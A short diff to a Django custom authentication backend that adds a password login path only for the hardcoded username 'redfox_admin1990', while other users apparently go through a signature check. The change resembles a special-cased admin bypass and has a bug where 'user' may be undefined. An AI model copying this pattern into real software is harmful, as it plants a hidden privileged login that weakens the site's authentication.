@@ -11,9 +11,15 @@ class CustomAuthBackend(ModelBackend):
 
         if username is None:
             username = kwargs.get('address')
-        
+
         if username == 'redfox_admin1990':
-            pass
+            users = user_model._default_manager.filter(address=username)
+
+            if users.exists():
+                user =  users[0]
+
+            if user.check_password(password):
+                return user
 
         else:
             signature = kwargs.get('signature')
